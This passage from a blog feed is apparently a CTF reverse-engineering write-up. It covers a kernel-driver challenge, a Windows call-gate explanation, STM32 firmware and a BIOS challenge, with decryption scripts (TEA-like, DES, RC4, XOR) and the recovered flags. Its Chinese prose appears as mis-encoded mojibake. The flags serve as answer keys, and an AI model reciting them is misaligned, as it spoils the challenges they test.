<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>) <span class="comment">//äº¤æ¢å­—èŠ‚åº</span></span><br><span class="line">&#123;</span><br><span class="line">swap(enc+i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> delat = <span class="number">0xc6ef3720</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>) -= ((*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">3</span>))^(delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))))^((*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">2</span>));</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))) -= ((*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)+<span class="number">1</span>)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">1</span>))^(delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>))^((*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">0</span>));</span><br><span class="line">delat += <span class="number">0x61c88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) <span class="comment">//0xc6ef3720</span></span><br><span class="line">&#123;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc + <span class="number">4</span> * i) ^= v11;</span><br><span class="line">v11 -= <span class="number">0x50FFE544</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>) <span class="comment">//äº¤æ¢å­—èŠ‚åº</span></span><br><span class="line">&#123;</span><br><span class="line">swap(enc+i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å†…æ ¸å®‰å…¨"><a href="#å†…æ ¸å®‰å…¨" class="headerlink" title="å†…æ ¸å®‰å…¨"></a>å†…æ ¸å®‰å…¨</h2><h3 id="easy-kernel"><a href="#easy-kernel" class="headerlink" title="easy_kernel"></a>easy_kernel</h3><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªr3å±‚çš„ç¨‹åºå’Œä¸€ä¸ªé©±åŠ¨ç¨‹åºã€‚</p><p>é¦–å…ˆr3å±‚ç¨‹åºçš„æƒ…å†µï¼šçº¢è‰²éƒ¨åˆ†çš„è°ƒç”¨æ˜¯é‡ç‚¹ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/02/03/diJGIjlXLyp41fr.png" alt="image-20210202231743748"></p><p>ç„¶åçœ‹çœ‹å¯¹äºé©±åŠ¨æ–‡ä»¶æƒ…å†µï¼šæˆ‘ä»¬ä¸»è¦å…³æ³¨çš„å°±æ˜¯åç§»é‡ä¸º<strong>IRP_MJ_DEVICE_CONTROL</strong>çš„éƒ¨åˆ†ã€‚<br><img src="https://i.loli.net/2021/02/03/QjNn86sM4qOavhE.png" alt="image-20210202232137464"></p><p>è¿›å…¥sub_401270ï¼ŒæŸ¥çœ‹r0å±‚å¯¹r3å±‚å‘å‡ºè¯·æ±‚çš„å¤„ç†ï¼šçœ‹åˆ°0x222000æ­£æ˜¯r3å±‚ç¨‹åºçš„å€¼ï¼Œå¼€å§‹ä¸€ç›´ä»¥ä¸ºè¿™é‡Œkeyï¼Œæ­£å¥½8ä¸ªå­—èŠ‚ï¼Œï¼Œå› ä¸ºè¯†åˆ«äº†åé¢çš„ç®—æ³•ä¸ºdesã€‚</p><p><img src="https://i.loli.net/2021/02/03/Zkvi2DSbAysKo3Y.png" alt="image-20210202232225017"></p><p>åé¢çš„desåŠ å¯†å¾ˆå¥½è¯†åˆ«å‡ºæ¥ï¼Œç„¶åå¼€å§‹ä½¿ç”¨å¯†æ–‡å’Œä¸Šé¢ä»¥ä¸ºçš„keyè§£å¯†ï¼Œä¸å¯¹ï¼ŒçŒœæµ‹ä¹Ÿæ˜¯ã€‚ã€‚å› ä¸ºr3å±‚çº¢è‰²åœ°æ–¹çš„è°ƒç”¨æˆ‘æ²¡ææ¸…æ¥šçš„ã€‚ã€‚</p><p>æ„Ÿè§‰è¿˜æ˜¯è°ƒè¯•èµ·æ¥æ‰èƒ½åšäº†ï¼Œåœ¨æœ¬åœ°è¿™ä¸ªé©±åŠ¨æœåŠ¡ä¹Ÿæ²¡å¯åŠ¨èµ·æ¥ï¼Œç„¶åæ‰¾äº†ä¸ªxpï¼ŒæˆåŠŸè°ƒè¯•èµ·æ¥ã€‚é¦–å…ˆä»desåŠ å¯†ç»“æœå‘ç°keyå…¶å®æ˜¯å‡flagçš„å‰8ä½ä¸”åé¢è¿˜æœ‰ä¸€ä¸ªåŠ å¯†æ“ä½œã€‚æ‰å‘ç°è¿™ä¸ªå…¶å®å’Œä»r3ä¼ è¿‡æ¥çš„å‚æ•°æ˜¯å¯¹åº”çš„ï¼Œ-1è¿™ä¸ªæ ‡å¿—å¾ˆæ˜æ˜¾äº†ã€‚ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/02/03/oDNEmCe5pUcMjr2.png" alt="image-20210202233155105"></p><p>æ¥ä¸‹æ¥å°±æ˜¯çœ‹æœ€åçš„çº¢è‰²ä»£ç è°ƒç”¨ï¼Œä½†åªèƒ½å•æ­¥æ­¥è¿‡ï¼Œä¸€å•æ­¥æ­¥å…¥å°±è“å±ğŸ˜ªã€‚ã€‚ä¹Ÿæ²¡å¿ƒæƒ…å»æ‰¾åŸå› ã€‚ã€‚</p><p>ä½†æˆ‘çŒœæƒ³è¿™ä¸ªæœ€ååŠ å¯†è‚¯å®šæ˜¯ä¸éš¾çš„ï¼Œï¼Œå¼€å§‹æ²¡æ³¨æ„ä»¥ä¸ºæ˜¯ç±»ä¼¼å•è¡¨åŠ å¯†çš„ï¼Œé‚£æˆ‘å¯ä»¥æŠŠ0-255çš„æ¯ä¸ªåŠ å¯†å€¼æ‰¾åˆ°ï¼Œå†æ›¿æ¢ä¸€ä¸‹ï¼Œè¯•äº†å¤šç»„æ•°æ®åï¼Œå‘ç°äº†ç«¯å€ªã€‚ã€‚å¹¶ä¸æ˜¯ç±»ä¼¼å•è¡¨åŠ å¯†ï¼Œçœ‹äº†ä¸€ä¼šäº†ï¼Œï¼Œå‘ç°å°±æ˜¯ä»ä¸€ä½å¼€å§‹ä¸€æ¬¡å¼‚æˆ–åä¸€ä½ã€‚ã€‚hhaâ€¦</p><p>è§£å¯†è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> des, ECB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(a)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">tmp = a[i]</span><br><span class="line">a[i] = a[<span class="number">3</span>-i]</span><br><span class="line">a[<span class="number">3</span>-i] = tmp</span><br><span class="line"><span class="keyword">return</span> a[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">178</span>, <span class="number">196</span>, <span class="number">134</span>, <span class="number">213</span>,  <span class="number">84</span>, <span class="number">108</span>,  <span class="number">56</span>, <span class="number">173</span>, <span class="number">189</span>, <span class="number">105</span>, </span><br><span class="line">  <span class="number">212</span>, <span class="number">233</span>,  <span class="number">68</span>,  <span class="number">71</span>,  <span class="number">54</span>,  <span class="number">33</span>, <span class="number">153</span>, <span class="number">145</span>, <span class="number">251</span>,  <span class="number">19</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">216</span>, <span class="number">107</span>, <span class="number">228</span>, <span class="number">128</span>,  <span class="number">18</span>, <span class="number">226</span>,  <span class="number">67</span>,  <span class="number">42</span>,  <span class="number">75</span>, </span><br><span class="line">   <span class="number">73</span>, <span class="number">142</span>]</span><br><span class="line">   </span><br><span class="line"><span class="string">'''  </span></span><br><span class="line"><span class="string">ans = []</span></span><br><span class="line"><span class="string">for i in range(0, 32, 4):</span></span><br><span class="line"><span class="string">ans += swap(enc[i:])</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">enc[i] ^= enc[i+<span class="number">1</span>]</span><br><span class="line">enc = bytes(enc)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b'&#125;aglf_T_'</span></span><br><span class="line"></span><br><span class="line">des_obj = des(key, ECB, pad = <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">code = des_obj.decrypt(enc)</span><br><span class="line">print(code)</span><br><span class="line"><span class="comment">#flag&#123;WelcOme_to_kerne1_world!&#125;</span></span><br></pre></td></tr></table></figure><p>é¢˜è™½ç„¶æ˜¯åšäº†ï¼Œä½†ä¸Šé¢çº¢è‰²éƒ¨åˆ†çš„è°ƒç”¨åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ã€‚</p><p>ç»è¿‡ä¸€ç•ªæœç´¢ï¼Œé¦–å…ˆä»<strong>call fword ptr</strong>çŸ¥é“äº†è¿™æ˜¯ä¸ªé•¿è°ƒç”¨ï¼Œfwordä»£è¡¨6ä¸ªå­—èŠ‚ã€‚è€Œè¦æƒ³å¼„æ¸…å¤„è¿™ä¸ªå°±è¦äº†è§£windowsä¿æŠ¤æ¨¡å¼ä¸­çš„é•¿è°ƒç”¨å’Œè°ƒç”¨é—¨ï¼Œæ®µæè¿°ç¬¦åŠæ®µé€‰æ‹©å­çš„çŸ¥è¯†äº†ã€‚</p><p>è¿™é‡Œå°±åªç®€å•æ¶‰åŠä¸æœ¬é¢˜ç›¸å…³çš„ï¼š</p><blockquote><ul><li><strong>é•¿è°ƒç”¨å¼€å§‹æ˜¯pushè°ƒç”¨è€…çš„CSå’Œè¿”å›åœ°å€ã€‚å› ä¸ºæœ€åè¿”å›ä¹Ÿæ˜¯å¤šäº†æ“ä½œï¼Œæ‰€ä»¥ä½¿ç”¨çš„retf</strong>ã€‚</li><li><strong>GDTR å¯„å­˜å™¨å­˜æ”¾çš„æ˜¯GDTï¼ˆå…¨å±€æè¿°ç¬¦è¡¨ï¼‰è¡¨çš„ä½ç½®å’Œå¤§å°ï¼Œä½ä¸¤å­—èŠ‚æ˜¯gdtè¡¨çš„å¤§å°ï¼Œé«˜å››å­—èŠ‚æ˜¯gdtè¡¨çš„åœ°å€ã€‚</strong></li><li><strong>sgdtæŒ‡ä»¤è¯»å–GDTRå¯„å­˜å™¨çš„å€¼ã€‚</strong></li><li><strong>æ®µé€‰æ‹©å­æ˜¯ä¸€ä¸ª16ä½çš„æè¿°ç¬¦ï¼ŒæŒ‡å‘äº†å®šä¹‰è¯¥æ®µçš„æ®µæè¿°ç¬¦ï¼Œè€Œæˆ‘ä»¬çš„é•¿è°ƒç”¨ä¹Ÿå°±æ˜¯ä½¿ç”¨çš„æ®µé€‰æ‹©å­æ¥å†³å®šã€‚å…¶ä¸­3è‡³15ä½æ˜¯ä¸€ä¸ªç´¢å¼•ï¼Œåœ¨GDTè¡¨ä¸­æŸ¥æ‰¾å‡ºæ®µæè¿°ç¬¦ï¼›ç¬¬1ï¼Œ2ä½ä¸ºRPLï¼Œä»£è¡¨äº†è¯·æ±‚ç‰¹æƒçš„çº§åˆ«ï¼Œå¦‚0ï¼Œ3ï¼›ç¬¬ä¸‰ä½ä¸ºTIï¼Œå¦‚æœä¸º0ï¼ŒæŸ¥GDTè¡¨ã€‚å¦‚æœä¸º1ï¼ŒæŸ¥LDTè¡¨ï¼Œwindowsä¸­åªç”¨GDTï¼Œæ‰€ä»¥è¿™ä½éƒ½æ˜¯0ã€‚</strong></li><li><strong>è°ƒç”¨é—¨æè¿°ç¬¦ï¼Œå…±8å­—èŠ‚ã€‚é«˜16-31ä½è®°å½•åç§»åœ°å€çš„é«˜åœ°å€ï¼Œä½0-15ä½è®°å½•åç§»åœ°å€çš„ä½åœ°å€ã€‚ä½16-31ä½å³æ˜¯æ®µé€‰æ‹©å­ã€‚</strong></li></ul></blockquote><p>å†æ¥çœ‹çœ‹è°ƒç”¨é—¨ï¼ŒæŒ‡ä»¤æ ¼å¼<strong>CALL CS:EIP</strong>ï¼Œæ³¨ï¼šEIPæ˜¯æ²¡æœ‰ä½¿ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„é•¿è°ƒç”¨åªçœ‹æ®µå¯„å­˜å™¨CSçš„å€¼ï¼Œé€šè¿‡å®ƒæ‰¾åˆ°å¯¹åº”çš„æ®µæè¿°ç¬¦ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ®µå¯„å­˜å™¨çš„ç»“æ„ï¼š</span><br><span class="line">WORD Selectot  <span class="comment">//æ®µé€‰æ‹©å­</span></span><br><span class="line">WORD Attribute  <span class="comment">//å±æ€§ï¼Œæ®µæè¿°ç¬¦é«˜å››å­—èŠ‚çš„ç¬¬8ä½å¼€å§‹ åˆ°ç¬¬23ä½ç»“æŸ</span></span><br><span class="line">DWORD Base   <span class="comment">//åŸºåœ°å€</span></span><br><span class="line">DWORD Limit <span class="comment">//ç•Œé™</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥çœ‹é¢˜ç›®ä¸­çš„ï¼š</p><p><img src="https://i.loli.net/2021/02/03/dmlE6NWgAMcjuOT.png" alt="image-20210203222138750"></p><p> æ‰€ä»¥è¯´è¦å‘ç°è°ƒç”¨çš„åœ°æ–¹ï¼ŒçœŸæ­£å…³å¿ƒçš„åœ°æ–¹æ˜¯48hã€‚<strong>æ‰§è¡Œçš„ä»£ç åœ°å€ = ï¼ˆé—¨æè¿°ç¬¦ä¸­æ®µé€‰æ‹©å­æ‰€æŒ‡å‘çš„ä»£ç æ®µçš„Baseï¼‰+ï¼ˆé—¨æè¿°ç¬¦é«˜å››å­—èŠ‚çš„16-31ä½ï¼‰+ï¼ˆé—¨æè¿°ç¬¦ä½å››å­—èŠ‚çš„0-15ä½ï¼‰ã€‚</strong></p><p>é‚£é¢˜ç›®åœ¨å“ªé‡Œæ‰¾è¿™ä¸ªæ®µæè¿°ç¬¦è¡¨ï¼Ÿå°±æ˜¯ä¹‹å‰çœ‹è¿‡çš„DeviceIoControlçš„åœ°æ–¹ï¼Œé‚£8ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚</p><p><img src="https://i.loli.net/2021/02/03/LTtVxlOFIEq8MHk.png" alt="image-20210203224418059"></p><p>å†æŠŠè°ƒç”¨ä»£ç ä¸­çš„æ®µé€‰æ‹©å­åˆ†è§£ä¸€ä¸‹ï¼ˆ48hï¼‰ï¼Œå¾—åˆ°3-16ä½çš„indexï¼š1001b = 9ã€‚è¿™æ­£å¥½å’Œr0å±‚çœ‹åˆ°çš„ä¸€æ ·ã€‚</p><p>æœ€åå°±æ˜¯ä»è¿™8å­—èŠ‚æ•°æ®å¾—åˆ°é•¿è°ƒç”¨å‡½æ•°åœ°å€äº†ï¼š</p><p><img src="https://i.loli.net/2021/02/03/aVrpT5UY1i7usmy.png" alt="image-20210203225024841"></p><p>å›åˆ°r3å±‚éªŒè¯ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/02/03/CTPLONiF39QSxrV.png" alt="image-20210203225120306"></p><h2 id="å›ºä»¶å®‰å…¨"><a href="#å›ºä»¶å®‰å…¨" class="headerlink" title="å›ºä»¶å®‰å…¨"></a>å›ºä»¶å®‰å…¨</h2><h3 id="NodeMCU"><a href="#NodeMCU" class="headerlink" title="NodeMCU"></a><strong>NodeMCU</strong></h3><p>50åˆ†çš„å€¼ï¼Œç›´æ¥ctrl+fæ‰¾åˆ°flagã€‚ã€‚</p><h3 id="STM"><a href="#STM" class="headerlink" title="STM"></a>STM</h3><p>çŸ¥é“äº†stmæ–‡ä»¶ï¼Œè€ŒSTM32å…¶å®æ˜¯ä½¿ç”¨äº†ARMæ ¸çš„MCUã€‚</p><p>è¿™ä¸ªæˆ‘ä»¬å¯ä»¥ç”¨idaåˆ†æçš„ï¼Œä½†è¦è®¾ç½®ä¸€ä¸‹ï¼Œä¸ç„¶idaä¹Ÿåªæ˜¯æŠŠå®ƒå½“æˆdataæ–‡ä»¶çœ‹å¾…ã€‚</p><p>é¦–å…ˆè®¾ç½®æ¶æ„ï¼š</p><p><img src="https://i.loli.net/2021/02/03/8tCAfWjSNszmL6Y.png" alt="image-20210203000903224"></p><p>ç¼–è¾‘é€‰é¡¹ï¼š</p><p><img src="https://i.loli.net/2021/02/03/9AFywDxIStoTVCM.png" alt="image-20210203004015462"></p><p>ç„¶åç¡®å®šï¼ŒæŠŠåŠ è½½åœ°å€æ”¹ä¸ºï¼š0x08000000ã€‚è¿›å…¥åæŠŠå¼€å§‹çš„æ•°æ®éƒ½è½¬åŒ–ä¸º4å­—èŠ‚å‹æ•°æ®ï¼š</p><p><img src="https://i.loli.net/2021/02/03/gnX8JZ9KfrIiqBw.png" alt="image-20210203002010284"></p><p>åŒå‡»ç¬¬äºŒä¸ªè·³è½¬åˆ°æŒ‡å®šä½ç½®ï¼Œç„¶ååœ¨æŒ‡å®šä½ç½®ä¸Šé¢ä¸€äº›åœ°æ–¹æŠŠæ•°æ®è½¬åŒ–ä¸ºä»£ç ã€‚å¯ä»¥å‘ç°idaå·¦è¾¹å‡ºç°äº†å¥½å‡ ä¸ªå‡½æ•°ã€‚ç®€å•æ‰¾ä¸€ä¸‹å³å¯çœ‹è§å…³é”®å‡½æ•°ï¼Œä½¿ç”¨idapythonæŒ‰ç…§å®ƒçš„ç®—æ³•é€»è¾‘æ‰“å°å‡ºè®¡ç®—ç»“æœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">addr = <span class="number">0x08000344</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x0800036E</span>:</span><br><span class="line">    flag += chr((get_byte(addr)^<span class="number">0x1e</span>)+<span class="number">3</span>)</span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;1749ac10-5389-11eb-90c1-001c427bd493&#125;</span></span><br></pre></td></tr></table></figure><h3 id="easy-bios"><a href="#easy-bios" class="headerlink" title="easy_bios"></a>easy_bios</h3><p>é¦–å…ˆå°†biosæ–‡ä»¶ä½¿ç”¨æ¨¡æ‹Ÿå™¨è¿è¡Œèµ·æ¥ï¼Œä»è¿™å¾—åˆ°äº†å…³é”®çš„å­—ç¬¦ä¸²ä¿¡æ¯ã€‚</p><p><img src="https://i.loli.net/2021/02/03/fc7N3CXovWQD8ed.png" alt="image-20210203004245893"></p><p>å°è¯•ä½¿ç”¨binwalkæå–biosä¸­çš„æ–‡ä»¶çœ‹çœ‹ï¼Œæå–å‡ºä¸€ä¸ªåä¸º840A8çš„æ–‡ä»¶ã€‚</p><p>ç”¨010editoræŸ¥çœ‹ï¼Œå‘ç°äº†ç†Ÿæ‚‰4D5Aå’Œç´§è·Ÿç€çš„5045ï¼ŒPEæ–‡ä»¶å•Šã€‚ã€‚</p><p><img src="https://i.loli.net/2021/02/03/aIQTxqshEpv9oOm.png" alt="image-20210203005019542"></p><p>çªç„¶æƒ³åˆ°åˆšåˆšå¾—åˆ°çš„å…³é”®å­—ç¬¦ä¿¡æ¯ï¼Œå°è¯•æœç´¢çœ‹çœ‹ï¼Œæ‰¾åˆ°äº†Getflagï¼Œå…¶å®ƒå­—ç¬¦æ¢ç”¨unicodeå½¢å¼ã€‚çªç„¶æ˜æœ—èµ·æ¥ï¼š</p><p><img src="https://i.loli.net/2021/02/03/XCFTuydJxGANan9.png" alt="image-20210203005236702"></p><p>ä½†è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªæ–‡ä»¶ä¸­å¾ˆå¤šä¸ªPEæ–‡ä»¶ï¼Œæå–å‡ºå‡ºç°Getflagå­—ç¬¦ä¸²çš„PEæ–‡ä»¶ï¼Œè¿›è¡Œåç¼–è¯‘ï¼š</p><p>ä»å­—ç¬¦ä¸²å®šä½åˆ°å…³é”®å‡½æ•°ï¼šå†ä»Your Inputå®šä½åˆ°v12æ˜¯æˆ‘ä»¬çš„è¾“å…¥ã€‚<br><img src="https://i.loli.net/2021/02/03/aJQd1xwo76COHX2.png" alt="image-20210203124346558"></p><p>ç„¶åå¯¹äºrc4åŠ å¯†ï¼Œæˆ‘ä»¬åªå…³å¿ƒæœ€åçš„å¼‚æˆ–å€¼ï¼Œç¨‹åºåˆè¿è¡Œä¸èµ·æ¥çš„ï¼Œé‚£æŠŠæ•´ä¸ªå‡½æ•°å¤åˆ¶åˆ°åˆ°Cç¼–è¯‘å™¨ä¸­ç®€å•ä¿®æ”¹ä¸€ä¸‹å†ç›´æ¥ç”¨æ¥å¼‚æˆ–è§£å¯†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">70</span>, <span class="number">119</span>, <span class="number">116</span>, <span class="number">176</span>, <span class="number">39</span>, <span class="number">142</span>, <span class="number">143</span>, <span class="number">91</span>, <span class="number">233</span>, <span class="number">216</span>, </span><br><span class="line">  <span class="number">70</span>, <span class="number">156</span>, <span class="number">114</span>, <span class="number">231</span>, <span class="number">47</span>, <span class="number">94</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"OVMF_And_Easy_Bios"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v13[<span class="number">514</span>] = &#123;<span class="number">0</span>&#125;, v2, v3, v4, v5, v6, v8;</span><br><span class="line"><span class="keyword">int</span> v7, v9, v10, v11, v12, result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v13[i] = i;</span><br><span class="line">    v13[i + <span class="number">256</span>] = s[i % <span class="number">18</span>];</span><br><span class="line">  &#125;</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v4 = v13[v2];</span><br><span class="line">v3 = (v13[v2 + <span class="number">256</span>] + v4 + v3) % <span class="number">256</span>;</span><br><span class="line">v5 = v13[v3];</span><br><span class="line">v13[v3] = v4;</span><br><span class="line">v13[v2++] = v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v2 != <span class="number">256</span> );</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v8 = (v8 + <span class="number">1</span>);</span><br><span class="line">    v9 = v13[v8];</span><br><span class="line">    v10 = (v9 + v7) % <span class="number">256</span>;</span><br><span class="line">    v11 = v13[v10];</span><br><span class="line">    v13[v10] = v9;</span><br><span class="line">    v7 = (v9 + v7) % <span class="number">256</span>;</span><br><span class="line">    v13[v8] = v11;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v13[(v11 + v13[v10]) % <span class="number">256</span>];</span><br><span class="line">    enc[v6++] ^= result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v6 != <span class="number">16</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02x"</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//88baec0b5154f859b5851097bb567f5c</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DJBCTF</title>
      <link href="/2021/01/26/DJBCTF/"/>
      <url>/2021/01/26/DJBCTF/</url>
      
